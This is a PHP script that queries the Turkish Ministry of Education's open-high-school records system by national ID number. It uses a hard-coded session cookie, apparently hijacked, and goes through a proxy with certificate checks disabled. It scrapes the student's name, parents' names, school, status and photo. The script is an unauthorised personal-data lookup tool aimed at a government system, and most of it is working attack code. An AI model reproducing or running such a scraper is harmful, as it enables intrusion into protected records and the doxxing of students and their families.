<?php
header('Content-type: text/html; charset=utf-8');
// Fayuxquarex
$sess = "g0yajs00smxeymac3tnx3ozx";

function ogrenciyicek($postdata)
{
    global $sess;
    $fayuj_proxy = "194.87.188.114";
    $fayuj_proxyport = "8000";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://aolweb.meb.gov.tr/AOL01001.aspx');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host' => 'aolweb.meb.gov.tr',
        'Cache-Control' => 'max-age=0',
        'Sec-Ch-Ua' => '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'Sec-Ch-Ua-Mobile' => '?0',
        'Sec-Ch-Ua-Platform' => '"macOS"',
        'Origin' => 'https://aolweb.meb.gov.tr',
        'Dnt' => '1',
        'Upgrade-Insecure-Requests' => '1',
        'Content-Type' => 'application/x-www-form-urlencoded',
        'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site' => 'same-origin',
        'Sec-Fetch-Mode' => 'navigate',
        'Sec-Fetch-User' => '?1',
        'Sec-Fetch-Dest' => 'document',
        'Referer' => 'https://aolweb.meb.gov.tr/AOL05001.aspx',
        'Accept-Encoding' => 'gzip, deflate',
        'Accept-Language' => 'en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7,da;q=0.6,so;q=0.5,hu;q=0.4,ru;q=0.3',
        'Connection' => 'close',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, "ASP.NET_SessionId=$sess; kullanici=; ekranTipi=");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);

    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);

    curl_close($ch);
    return $response;
}

function curl_get_contents($url)
{
    global $sess;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_COOKIE, "ASP.NET_SessionId=$sess; kullanici=; ekranTipi=");

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}

function imageToBase64($image)
{
    $imageData = base64_encode(curl_get_contents($image));

    return $imageData;
}

error_reporting(E_ERROR | E_PARSE);

$tttc = $_GET["tc"];

$ilkadim = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUIODY5NzQ5OTUPZBYCAgMPZBYGAgEPZBYCAgUPZBYCZg9kFgICAw9kFgICAQ8PFgIeB0VuYWJsZWRoZGQCAw9kFggCAQ8PFgIeBFRleHQF5wIgPHRyPjx0ZCBjb2xzcGFuPSIzIiB0aXRsZT0iw4fEsWvEscWfIiBjbGFzcz0ia2FiYXJ0bWEiPiA8aW1nIHNyYz0iaW1hZ2VzL3Npc3RlbWRlbl9jaWsucG5nIiBoZWlnaHQ9IjQ1IiBvbm1vdXNlb3Zlcj0idGhpcy5zcmM9J2ltYWdlcy9zaXN0ZW1kZW5fY2lrX2EucG5nJzt0aGlzLnN0eWxlLmN1cnNvcj0naGFuZCc7IiAgb25tb3VzZW91dD0idGhpcy5zcmM9J2ltYWdlcy9zaXN0ZW1kZW5fY2lrLnBuZyc7dGhpcy5zdHlsZS5jdXJzb3I9J2RlZmF1bHQnOyIgIGFsdD0iR8O8dmVubGkgw4fEsWvEscWfIMSww6dpbiBUxLFrbGF5xLFuxLF6IiAgb25jbGljaz0iamF2YXNjcmlwdDpmbklzbGVtKCcxJyk7Ii8%2BICA8L3RkPjwvdHI%2BIGRkAgUPDxYCHwEF5AIgPHRyPjx0ZCBjb2xzcGFuPSIzIiB0aXRsZT0iw4fEsWvEscWfIiBjbGFzcz0ia2FiYXJ0bWEiID48aW1nIHNyYz0iaW1hZ2VzL29ncmVuY2lfYXJhbWEucG5nIiBoZWlnaHQ9IjQ1IiBvbm1vdXNlb3Zlcj0idGhpcy5zcmM9J2ltYWdlcy9vZ3JlbmNpX2FyYW1hX2EucG5nJzt0aGlzLnN0eWxlLmN1cnNvcj0naGFuZCc7IiAgb25tb3VzZW91dD0idGhpcy5zcmM9J2ltYWdlcy9vZ3JlbmNpX2FyYW1hLnBuZyc7dGhpcy5zdHlsZS5jdXJzb3I9J2RlZmF1bHQnOyIgIGFsdD0iw5bEn3JlbmNpIEFyYW1hIMSww6dpbiBUxLFrbGF5xLFuxLF6IiAgb25jbGljaz0iamF2YXNjcmlwdDpmbklzbGVtKCcyJyk7Ii8%2BICA8L3RkPjwvdHI%2BIGRkAgkPDxYCHgdWaXNpYmxlaGQWBAIBD2QWAgIBD2QWAgIBD2QWAgIBDxYCHgV2YWx1ZWRkAgMPFgIfAQViPFNDUklQVCBMQU5HVUFHRT0nSmF2YVNjcmlwdCcgVFlQRT0ndGV4dC9qYXZhc2NyaXB0Jz5kb2N1bWVudC5mb3JtMS50eHRPZ3JlbmNpTm8uZm9jdXMoKTs8L1NDUklQVD5kAgsPFgIfAQXrPDxkaXYgaWQ9J2Nzc21lbnUnPjx1bD48bGk%2BPGEgaHJlZj0nIyc%2BPHNwYW4gY2xhc3M9Imt1bGxhbmljaV9hZGkiPkt1bGxhbsSxY8SxIEFkxLEuLjogxLBMTEVHQUxUT1BMVU0uT1JHTEVYUEVSMjxiciAvPlNJTkRJUkdJIE1FU0xFS8SwIFZFIFRFS07EsEsgQU5BRE9MVSBMxLBTRVPEsDwvc3Bhbj48L2E%2BPC9saT48bGkgY2xhc3M9J2hhcy1zdWIgYWN0aXZlJz48YSBocmVmPScjJz48c3Bhbj7DlsSeUkVOQ8SwIEdFTkVMIELEsExHxLBMRVI8L3NwYW4%2BPC9hPjx1bCBzdHlsZT0nZGlzcGxheTogYmxvY2s7Jz48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMTEuYXNweCcpPjxzcGFuPkFsaW5hbiBCZWxnZWxlcjwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMTguYXNweCcpPjxzcGFuPkFyxZ9pdiBCaWxnaWxlcmk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAxMDI1LmFzcHgnKT48c3Bhbj5EZXJzIEJpbGdpbGVyaSAoQWzEsW5hbik8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAxMDI2LmFzcHgnKT48c3Bhbj5EZXJzIEJpbGdpbGVyaSAoR2VuZWwpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMTAxMy5hc3B4Jyk%2BPHNwYW4%2BRMO2bmVtIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMjkuYXNweCcpPjxzcGFuPkTDtm5lbSBEZXJzbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMjMuYXNweCcpPjxzcGFuPkUtT2t1bCBUYXNkaWtuYW1lIERlcnNsZXJpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMTAxNC5hc3B4Jyk%2BPHNwYW4%2BR2VsZGnEn2kgU2lzdGVtIEdldGlyZGnEn2kgQmVsZ2U8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAxMDEwLmFzcHgnKT48c3Bhbj5HZW5lbCBCaWxnaWxlcjwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMTUuYXNweCcpPjxzcGFuPktpbWxpayBCaWxnaWxlcmk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAxMDE5LmFzcHgnKT48c3Bhbj5LaXRhcCBCaWxnaWxlcmk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAxMDAyLmFzcHgnKT48c3Bhbj5LcmVkaSBCaWxnaWxlcmk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpICBjbGFzcz0nbGlSZW5rVmVybWUnPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDEwMDEuYXNweCcpPjxzcGFuPsOWxJ9yZW5jaSBBcmFtYTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignUlBUMDEwMjcuYXNweCcpPjxzcGFuPlRyYW5za3JpcHQgKE5vdCBEw7Zrw7xtw7wpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMTAyMi5hc3B4Jyk%2BPHNwYW4%2Bw5xjcmV0IEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48L3VsPjwvbGk%2BPGxpIGNsYXNzPSdoYXMtc3ViJz48YSBocmVmPScjJz48c3Bhbj5CxLBMR8SwIETDnFpFTkxFTUU8L3NwYW4%2BPC9hPjx1bD48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwMDMuYXNweCcpPjxzcGFuPkFkcmVzIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwNDguYXNweCcpPjxzcGFuPkJlbGdlIFRhcmFtYTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwMzYuYXNweCcpPjxzcGFuPktpbWxpayB2ZSBCYW5kcm9sIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwMjMuYXNweCcpPjxzcGFuPktpdGFwIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwNTAuYXNweCcpPjxzcGFuPk1hw7ZsIETDtm5lbSBFa2xlbWU8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDQwLmFzcHgnKT48c3Bhbj5OYWtpbCBHw7ZuZGVybWU8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDQxLmFzcHgnKT48c3Bhbj5OYWtpbCBPbmF5PC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMjA0NC5hc3B4Jyk%2BPHNwYW4%2Bw5bEn3JlbmNpIERvc3lhc8SxIERldnJldG1lPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMjA0NS5hc3B4Jyk%2BPHNwYW4%2Bw5bEn3JlbmNpIERvc3lhc8SxIFRlc2xpbSBBbG1hPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMjAwOS5hc3B4Jyk%2BPHNwYW4%2Bw5bEn3JlbmNpIFNpbDwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwMjAuYXNweCcpPjxzcGFuPlJlc2ltIEVrbGU8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDE1LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIEJlbGdlIEdpcmnFn2k8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDQ3LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIERlcnMgQXRhbWE8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDU3LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIERldmFtc8SxemzEsWs8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDUzLmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIERldmFtc8SxemzEsWsgR2lyacWfaSAoR3J1cCk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDU0LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIERldmFtc8SxemzEsWsgw5bEn3JlbmNpKExzdCk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDM0LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIE5vdCBHaXJpxZ9pIChHcnVwKTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDIwMjQuYXNweCcpPjxzcGFuPlnDvHogWcO8emUgTm90IEdpcmnFn2kgKMOWxJ9yZW5jaSk8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAyMDU2LmFzcHgnKT48c3Bhbj5Zw7x6IFnDvHplIMOWZ3JldG1lbiBBa3Rhcm1hPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMjA1NS5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSDDnGNyZXQgRHVydW11PC9zcGFuPjwvYT48L2xpPjwvdWw%2BPC9saT48bGkgY2xhc3M9J2hhcy1zdWInPjxhIGhyZWY9JyMnPjxzcGFuPsOWxJ5SRU5DxLAgxLDFnkxFUsSwPC9zcGFuPjwvYT48dWw%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDAxMDA0LmFzcHgnKT48c3Bhbj7Dh8Sxa21hIEJlbGdlc2k8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDAxMDE4LmFzcHgnKT48c3Bhbj5EaXBsb21hIEthecSxcCBCZWxnZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAzMC5hc3B4Jyk%2BPHNwYW4%2BRUstQzI8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDAxMDM5LmFzcHgnKT48c3Bhbj7EsMWfIFllcmkgQcOnbWEgQmVsZ2VzaS1ZZW5pPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAwOS5hc3B4Jyk%2BPHNwYW4%2BTWV6dW5peWV0IFlhesSxc8SxPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAwMS5hc3B4Jyk%2BPHNwYW4%2Bw5bEn3JlbmNpIEJlbGdlc2k8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDAxMDM1LmFzcHgnKT48c3Bhbj7DlsSfcmVuY2kgS2ltbGlrIEJlbGdlc2k8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDAxMDM3LmFzcHgnKT48c3Bhbj7DlsSfcmVuY2kgS2ltbGlrIEJlbGdlc2kgKFRla2xpKTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignUlBUMDEwMDIuYXNweCcpPjxzcGFuPlRhc2Rpa25hbWUgQmVsZ2VzaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignUlBUMDEwMDMuYXNweCcpPjxzcGFuPlRhc2Rpa25hbWUgS2F5xLFwPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAwNS5hc3B4Jyk%2BPHNwYW4%2BVHJhbnNrcmlwdCBCZWxnZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAyMi5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSBEZXJzbGVyPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAyNi5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSBEdXJ1bSBCZWxnZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAyNC5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSBFxJ9pdGltIMOWxJ9yZW5jaSBMaXN0ZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwMTAyMy5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSBUYW1hbWxhbWEgQmVsZ2VzaTwvc3Bhbj48L2E%2BPC9saT48L3VsPjwvbGk%2BPGxpIGNsYXNzPSdoYXMtc3ViJz48YSBocmVmPScjJz48c3Bhbj5NRVNBSkxBUjwvc3Bhbj48L2E%2BPHVsPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wxMjAxMC5hc3B4Jyk%2BPHNwYW4%2BS3VydW0gR2VsZW4gTWVzYWpsYXI8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDEyMDAxLmFzcHgnKT48c3Bhbj7DlsSfcmVuY2kgTWVzYWogQXRtYTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMTIwMDguYXNweCcpPjxzcGFuPlnDvHogWcO8emUgS3VydW0gw5bEn3JlbmNpIE1lc2FqIEF0bWEgLSBHcnVwPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wxMjAwNy5hc3B4Jyk%2BPHNwYW4%2BWcO8eiBZw7x6ZSBLdXJ1bWxhciBHZWxlbiBNZXNhamxhcjwvc3Bhbj48L2E%2BPC9saT48L3VsPjwvbGk%2BPGxpIGNsYXNzPSdoYXMtc3ViJz48YSBocmVmPScjJz48c3Bhbj5NRVpVTsSwWUVUIMSwxZ5MRU1MRVLEsDwvc3Bhbj48L2E%2BPHVsPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwMzAwOC5hc3B4Jyk%2BPHNwYW4%2BRGlwbG9tYSBCYXPEsW08L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDAzMDAzLmFzcHgnKT48c3Bhbj5EaXBsb21hIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDMwMDkuYXNweCcpPjxzcGFuPkRpcGxvbWEgRGVmdGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDMwMDYuYXNweCcpPjxzcGFuPkRpcGxvbWEgVGFraXA8L3NwYW4%2BPC9hPjwvbGk%2BPC91bD48L2xpPjxsaSBjbGFzcz0naGFzLXN1Yic%2BPGEgaHJlZj0nIyc%2BPHNwYW4%2BxLBTVEFUxLBTVMSwSzwvc3Bhbj48L2E%2BPHVsPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wxMTAwOS5hc3B4Jyk%2BPHNwYW4%2BxLBzdGF0aXN0aWstRMO2bmVtPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wxMTAxMC5hc3B4Jyk%2BPHNwYW4%2BxLBzdGF0aXN0aWstTWV6dW48L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDExMDA4LmFzcHgnKT48c3Bhbj5LdXJ1bSDEsHN0YXRpc3Rpazwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMTEwMDcuYXNweCcpPjxzcGFuPlnDvHogWcO8emUgRcSfaXRpbTwvc3Bhbj48L2E%2BPC9saT48L3VsPjwvbGk%2BPGxpIGNsYXNzPSdoYXMtc3ViJz48YSBocmVmPScjJz48c3Bhbj5LQVlJVCBZRU7EsExFTUUgLyBERVJTIFNFw4dNRTwvc3Bhbj48L2E%2BPHVsPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwNTAwMS5hc3B4Jyk%2BPHNwYW4%2BS2F5xLF0IFllbmlsaXllbiBMaXN0ZXNpPC9zcGFuPjwvYT48L2xpPjwvdWw%2BPC9saT48bGkgY2xhc3M9J2hhcy1zdWInPjxhIGhyZWY9JyMnPjxzcGFuPllFTsSwIEtBWUlUIMSwxZ5MRU1MRVLEsDwvc3Bhbj48L2E%2BPHVsPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwNDAwMi5hc3B4Jyk%2BPHNwYW4%2BRm9ybS1DIMOWxJ9yZW5jaSBMaXN0ZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdSUFQwNDAwNC5hc3B4Jyk%2BPHNwYW4%2BWWVuaSBLYXnEsXQgRG9zeWEgS2FwYcSfxLE8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ1JQVDA0MDAxLmFzcHgnKT48c3Bhbj5ZZW5pIEthecSxdCBMaXN0ZXNpPC9zcGFuPjwvYT48L2xpPjxsaSA%2BPGEgb25jbGljaz1TYXlmYURlZ2lzdGlyKCdBT0wwNDAxNS5hc3B4Jyk%2BPHNwYW4%2BWWVuaSBLYXnEsXQgUmFwb3JsYXLEsTwvc3Bhbj48L2E%2BPC9saT48L3VsPjwvbGk%2BPGxpIGNsYXNzPSdoYXMtc3ViJz48YSBocmVmPScjJz48c3Bhbj5LVUxMQU5JQ0kgxLDFnkxFTUxFUsSwPC9zcGFuPjwvYT48dWw%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDA5MDIxLmFzcHgnKT48c3Bhbj5Fa3JhbiBZZXRraWxlbmRpcm1lIFPEsWsgS3VsbGFuxLFsYW48L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDA5MDAxLmFzcHgnKT48c3Bhbj7DlsSfcmVuY2kgxZ5pZnJlIERlxJ9pxZ90aXJtZTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDkwMDMuYXNweCcpPjxzcGFuPsWeaWZyZSBEZcSfacWfdGlybWU8L3NwYW4%2BPC9hPjwvbGk%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDA5MDAyLmFzcHgnKT48c3Bhbj7FnmlmcmUgR8O2cm1lLU9sdcWfdHVybWE8L3NwYW4%2BPC9hPjwvbGk%2BPC91bD48L2xpPjxsaSBjbGFzcz0naGFzLXN1Yic%2BPGEgaHJlZj0nIyc%2BPHNwYW4%2BVEFOSU0gxLDFnkxFTUxFUsSwPC9zcGFuPjwvYT48dWw%2BPGxpID48YSBvbmNsaWNrPVNheWZhRGVnaXN0aXIoJ0FPTDA4MDI2LmFzcHgnKT48c3Bhbj5LdXJ1bSDEsGxldGnFn2ltIEJpbGdpbGVyaTwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDgwMzAuYXNweCcpPjxzcGFuPlnDvHogWcO8emUgS3VydW0gR3J1cDwvc3Bhbj48L2E%2BPC9saT48bGkgPjxhIG9uY2xpY2s9U2F5ZmFEZWdpc3RpcignQU9MMDgwMjcuYXNweCcpPjxzcGFuPlnDvHogWcO8emUgS3VydW0gS29udGVuamFuIEdpcmnFn2k8L3NwYW4%2BPC9hPjwvbGk%2BPC91bD48L2xpPjwvdWw%2BPC9kaXY%2BZAIRD2QWAgIDDzwrABECARAWABYAFgAMFCsAAGQYAQUQZ3JkQXJhbWFTb251Y2xhcg9nZCCKOA7qoQ7Se6xBLT8z7M69PSvOS19syeMIYXCazoZ%2B&__VIEWSTATEGENERATOR=F150AE2E&__EVENTVALIDATION=%2FwEdABLgXs%2BRFboz%2FVNATIF5HVhaE5BzA3IsloytOWgoLrNB0sk5bPNY8Vl%2F01pSEsERUDU%2FP2t0sRKie6QowjMVbUC%2BwXMmIRpb288Q5xdYwuRXRFMkAxPDmKGPyDPZfcGiLEvGJ%2FXPm8XqE%2FTtURxwFTRY0fEMhYMZv5%2FVGOKAB0PPBWJjpxqx4zg8CKrIPOXtOyOtTprzxR9p4fTZoGt4ugLyQnm2P%2BmLMJm5XxOkQyY0w7RnqjiT3qe1%2F7Do4XclXHmnww19iHD9tO1vaPwQT4i2OXysFOtalHQIEEwA5ZFNU1LQpyO8M%2Bmwp6oLjWnbjKhFqvK5eE9wPWL2YJArQsMuU0Ozoq%2FVD2UKqvPrZ173%2Bty6VPv47GAUxLinBp9WOlNOxA7esYgHRMTBZRdMpl6KAiGz1SahNbTGf%2FLoz3u8dw%3D%3D&PageHeader1%24hdnParaKontrol=&PageHeader1%24txtSure=+045%3A30&PageHeader1%24txtSunucu=&SolMenu1%24hdnMenuName=1&SolMenu1%24hdnIslem=&hdnPageMode=1&hdnKutukDurum=&hdnIslemNo=&hdnOgrenciNo=&txtOgrenciNo=&txtTCNo=$tttc&txtAd=&txtSoyad=&txtBabaAd=&txtAnaAd="

$str = ogrenciyicek($ilkadim);

//print_r($str);

$doc = new DOMDocument();
$doc->loadHTML($str);
//$evT = @$doc->getElementById('__EVENTTARGET')->getAttribute('value');
//$evA = $doc->getElementById('__EVENTARGUMENT')->getAttribute('value');
$evVS = $doc->getElementById('__VIEWSTATE')->getAttribute('value');
$vS = $doc->getElementById('__VIEWSTATEGENERATOR')->getAttribute('value');
$eVal = $doc->getElementById('__EVENTVALIDATION')->getAttribute('value');
try{
$ogrencino = $doc->getElementById('grdAramaSonuclar')->getElementsByTagName("td")[1]->nodeValue;
}
catch(Error $e){
	exit(31);
}

$digerleri = "&PageHeader1%24hdnParaKontrol=0&PageHeader1%24txtSure=+041%3A47&PageHeader1%24txtSunucu=&SolMenu1%24hdnMenuName=1&SolMenu1%24hdnIslem=&hdnPageMode=2&hdnKutukDurum=&hdnIslemNo=&hdnOgrenciNo=$ogrencino&txtOgrenciNo=&txtTCNo=$tttc&txtAd=&txtSoyad=&txtBabaAd=&txtAnaAd=";

$evVS = urlencode($evVS);
$vs = urlencode($vs);
$eVal = urlencode($eVal);

$hmm = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=$evVS&__VIEWSTATEGENERATOR=$vS&__EVENTVALIDATION=$eVal";
$str = ogrenciyicek($hmm.$digerleri);

$tccek = $tttc;
$resim = imageToBase64("https://aolweb.meb.gov.tr/ResimGoster.aspx");
$doc = new DOMDocument();
$doc->loadHTML($str);
$adi = $doc->getElementById('lblAdi')->nodeValue;
$soyadi = $doc->getElementById('lblSoyadi')->nodeValue;
$babaadi = $doc->getElementById('lblBabaAdi')->nodeValue;
$anneadi = $doc->getElementById('lblAnneAdi')->nodeValue;
$ogrencilikdurumu = $doc->getElementById('lblOgrDurum')->nodeValue;
$okul = $doc->getElementById('lblOkulBolum')->nodeValue;
$ogrencino = $doc->getElementById('lblOgrenciNo')->nodeValue;
$sonaktifdonemi = $doc->getElementById('lblSonDonem')->nodeValue; //okey mi ++
